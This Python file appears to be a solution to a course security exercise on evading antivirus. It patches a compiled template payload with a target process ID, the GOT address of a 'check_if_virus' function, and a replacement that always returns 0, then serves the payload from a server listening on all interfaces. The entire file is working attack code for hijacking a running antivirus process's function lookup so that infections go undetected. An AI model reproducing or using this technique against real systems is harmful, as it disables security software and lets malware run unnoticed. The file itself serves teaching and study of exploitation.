import server
import struct
from addresses import CHECK_IF_VIRUS_GOT, CHECK_IF_VIRUS_ALTERNATIVE, address_to_bytes

TEMPLATE_PATH = "./q3.template"
ANTI_PID_HOLDER = 0x12345678
CHECK_VIRUS_GOT_HOLDER = 0x87654321
REPLACE_VIRUS_HOLDER = 0x71727374

class SolutionServer(server.EvadeAntivirusServer):

    def get_payload(self, pid):
        # Return a payload that will replace the GOT entry for check_if_virus
        # with another function of a similar signature, that will return 0.
        # 1. You can assume we already compiled q3.c into q3.template.
        # 2. Use CHECK_IF_VIRUS_GOT and CHECK_IF_VIRUS_ALTERNATIVE.
        with open(TEMPLATE_PATH, 'rb') as reader:
            payload_template = reader.read()

        # convert the address to bytes before lookup
        anti_pid_holder_bytes = address_to_bytes(ANTI_PID_HOLDER)
        check_virus_holder_bytes = address_to_bytes(CHECK_VIRUS_GOT_HOLDER)
        replace_virus_holder_bytes = address_to_bytes(REPLACE_VIRUS_HOLDER)

        # find and replace with the real value in the .text segment of the template binary
        pid_addr = payload_template.find(anti_pid_holder_bytes)
        check_virus_addr = payload_template.find(check_virus_holder_bytes)
        replace_virus_addr = payload_template.find(replace_virus_holder_bytes)

        payload = payload_template
        payload = payload[:pid_addr] + address_to_bytes(pid) + payload[pid_addr+4:]
        payload = payload[:check_virus_addr] + address_to_bytes(CHECK_IF_VIRUS_GOT) + payload[check_virus_addr+4:]
        payload = payload[:replace_virus_addr] + address_to_bytes(CHECK_IF_VIRUS_ALTERNATIVE) + payload[replace_virus_addr+4:]

        return payload
        

    def print_handler(self, payload, product):
        print(product)

    def evade_antivirus(self, pid):
        self.add_payload(
            self.get_payload(pid),
            self.print_handler)


if __name__ == '__main__':
    SolutionServer().run_server(host='0.0.0.0', port=8000)

